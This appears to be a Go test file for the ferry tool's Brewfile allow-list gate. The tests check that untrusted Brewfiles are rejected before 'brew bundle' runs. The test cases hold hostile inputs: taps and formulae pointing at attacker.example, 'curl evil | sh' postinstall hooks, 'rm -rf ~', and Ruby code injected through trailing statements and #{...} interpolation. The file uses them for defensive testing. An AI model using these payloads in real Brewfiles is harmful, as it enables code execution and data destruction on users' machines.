package deps

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/REPPL/ferry/internal/platform"
)

// A cloned config repo's Brewfile is UNTRUSTED input: `brew bundle --file=` runs
// install-time code, so ferry gates every directive with an allow-list. The gate
// MUST be a SUPERSET of what `brew bundle dump` emits (brew/cask/mas/tap/vscode,
// name-shaped args) so a capture->apply round-trip of ferry's own dump always
// passes, and it MUST refuse the code-execution vectors (URL/custom-tap args,
// local-path formulae, args:/postflight blocks, arbitrary Ruby directives).

// TestValidateBrewfile_RoundTripsDumpOutput proves every shape `brew bundle dump`
// emits is ACCEPTED, so ferry consuming its own dump never breaks.
func TestValidateBrewfile_RoundTripsDumpOutput(t *testing.T) {
	dump := `# a describe comment brew bundle dump emits with --describe
tap "specstoryai/tap"
brew "aspell"
brew "git-filter-repo"
brew "node@18"
brew "ruby", link: false
cask "iterm2"
cask "docker-desktop"
mas "1Password 7", id: 1333542190
mas "Xcode", id: 497799835
vscode "ms-python.python"
whalebrew "whalebrew/wget"
`
	entries, err := parseBrewfileLines(dump)
	if err != nil {
		t.Fatalf("dump-shaped Brewfile must round-trip (be accepted), got error: %v", err)
	}
	// Comment stripped; every directive kept verbatim.
	if len(entries) != 11 {
		t.Fatalf("expected 11 directive entries, got %d: %v", len(entries), entries)
	}
	if entries[0] != `tap "specstoryai/tap"` {
		t.Errorf("first entry not preserved verbatim: %q", entries[0])
	}
}

// TestValidateBrewfile_RejectsCodeExecutionVectors proves each dangerous form is
// refused (fail closed, whole manifest rejected).
func TestValidateBrewfile_RejectsCodeExecutionVectors(t *testing.T) {
	cases := []struct {
		name string
		line string
	}{
		{"custom-tap-url", `tap "evil/tap", "https://attacker.example/repo.git"`},
		{"remote-formula-url", `brew "https://attacker.example/evil.rb"`},
		{"local-path-formula", `brew "./payload.rb"`},
		{"parent-path-formula", `brew "../../etc/evil"`},
		{"home-path-formula", `brew "~/evil.rb"`},
		{"cask-args-block", `cask "foo", args: { appdir: "~/Applications" }`},
		{"brew-postinstall", `brew "foo", postinstall: "curl evil | sh"`},
		{"arbitrary-ruby-system", `system "rm -rf ~"`},
		{"third-party-directive-npm", `npm "@openai/codex"`},
		{"cask_args-directive", `cask_args appdir: "/Applications"`},
		{"mas-without-id", `mas "Xcode"`},
		{"tap-three-segments", `tap "a/b/c"`},
		// Trailing Ruby riding after a valid `keyword "name"` prefix: each is
		// instance_eval'd by `brew bundle`, so the end-anchor must refuse them.
		{"trailing-semicolon-system", `brew "git"; system "id > /tmp/pwned"`},
		{"trailing-if-system", `brew "git" if system("id")`},
		{"trailing-and-system", `cask "iterm2" and system("evil")`},
		{"trailing-unless-system", `brew "git" unless system("id")`},
		{"trailing-method-block", `brew "git".tap{|_| system("touch /tmp/x")}`},
		// Ruby DOUBLE-quoted strings interpolate #{...} at evaluation time, and
		// `brew bundle --file=` evaluates the whole Brewfile as Ruby. Every accepted
		// double-quoted literal (option value, mas app name, brew/cask/tap/vscode
		// name) must therefore reject the `#{` interpolation marker, or it executes
		// arbitrary code as the invoking user during `ferry apply --deps`.
		{"interp-option-value-system", `brew "git", opt: "#{system('id')}"`},
		{"interp-option-value-popen", `cask "iterm2", y: "#{IO.popen('id')}"`},
		{"interp-mas-app-name", `mas "#{system('id')}", id: 123`},
		{"interp-brew-name", `brew "#{system('id')}"`},
		{"interp-cask-name", `cask "#{IO.popen('id').read}"`},
		{"interp-tap-name", `tap "#{system('id')}/repo"`},
		{"interp-vscode-name", `vscode "#{system('id')}"`},
		{"interp-mid-option-value", `brew "git", note: "prefix-#{system('id')}-suffix"`},
		// Ruby also interpolates the shorthand `#@ivar` / `#@@cvar` (instance/class
		// variable) and `#$global` forms in a double-quoted string. These interpolate
		// a variable's value rather than an arbitrary expression, so they are not RCE
		// on their own, but an accepted allow-list literal must be inert — they are
		// refused too so nothing but a plain string reaches `brew bundle`.
		{"interp-ivar-option-value", `brew "git", note: "#@foo"`},
		{"interp-cvar-option-value", `brew "git", note: "#@@foo"`},
		{"interp-global-option-value", `brew "git", note: "#$PATH"`},
		{"interp-ivar-mas-name", `mas "app#@x", id: 1`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := parseBrewfileLines(tc.line); err == nil {
				t.Errorf("expected %q to be REJECTED by the Brewfile gate, but it was accepted", tc.line)
			}
		})
	}
}

// TestValidateBrewfile_ParseManifestPropagatesError proves the gate is wired into
// the manifest read path (Entries/Install consume this), so a hostile Brewfile is
// refused before `brew bundle` ever runs.
func TestValidateBrewfile_ParseManifestPropagatesError(t *testing.T) {
	dir := t.TempDir()
	// depsDir layout: <repo>/deps/Brewfile.darwin — write a repo root + deps/.
	depsDir := filepath.Join(dir, "deps")
	if err := os.MkdirAll(depsDir, 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(depsDir, "Brewfile.darwin")
	if err := os.WriteFile(target, []byte(`brew "https://evil/x.rb"`), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := ParseManifest(target, platform.ManagerBrew); err == nil {
		t.Errorf("ParseManifest must propagate the Brewfile gate rejection")
	}
}

// TestInstallBrew_HostileBrewfileNeverRunsBundle proves the allow-list gate is
// WIRED into the brew install path: install() on a Brewfile carrying arbitrary
// Ruby must ABORT with an error and NEVER invoke `brew bundle` on it (which would
// instance_eval the Ruby as root-of-user). This is the end-to-end control the
// CHANGELOG claims — a cloned repo's Brewfile is gated before Homebrew runs it.
func TestInstallBrew_HostileBrewfileNeverRunsBundle(t *testing.T) {
	dir := t.TempDir()
	depsDir := filepath.Join(dir, "deps")
	if err := os.MkdirAll(depsDir, 0o755); err != nil {
		t.Fatal(err)
	}
	shared := filepath.Join(depsDir, "Brewfile.darwin")
	hostile := "brew \"foo\", postinstall: \"curl evil | sh\"\nsystem \"rm -rf ~\"\n"
	if err := os.WriteFile(shared, []byte(hostile), 0o644); err != nil {
		t.Fatal(err)
	}
	m := Manifest{Manager: platform.ManagerBrew, GOOS: "darwin", Shared: shared,
		Local: filepath.Join(depsDir, "Brewfile.darwin.local")}

	r := newFakeRunner()
	if _, err := install(m, r); err == nil {
		t.Fatalf("install must REFUSE a hostile Brewfile before running brew bundle")
	}
	if r.invoked("bundle") {
		t.Fatalf("install invoked `brew bundle` on a hostile Brewfile — gate not wired: %v", r.calls)
	}
}

// TestInstallBrew_HostileLocalOverlayAbortsBeforeAnyBundle proves ALL Brewfiles
// are validated up front: a benign shared file with a HOSTILE .local overlay must
// abort before ANY `brew bundle` runs, so the overlay can never execute after the
// shared file's packages were already installed.
func TestInstallBrew_HostileLocalOverlayAbortsBeforeAnyBundle(t *testing.T) {
	dir := t.TempDir()
	depsDir := filepath.Join(dir, "deps")
	if err := os.MkdirAll(depsDir, 0o755); err != nil {
		t.Fatal(err)
	}
	shared := filepath.Join(depsDir, "Brewfile.darwin")
	local := filepath.Join(depsDir, "Brewfile.darwin.local")
	if err := os.WriteFile(shared, []byte("brew \"zoxide\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(local, []byte("brew \"htop\"; system \"id\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	m := Manifest{Manager: platform.ManagerBrew, GOOS: "darwin", Shared: shared, Local: local}

	r := newFakeRunner()
	if _, err := install(m, r); err == nil {
		t.Fatalf("install must REFUSE when the .local overlay is hostile")
	}
	if r.invoked("bundle") {
		t.Fatalf("install ran `brew bundle` before the overlay was validated — must abort first: %v", r.calls)
	}
}
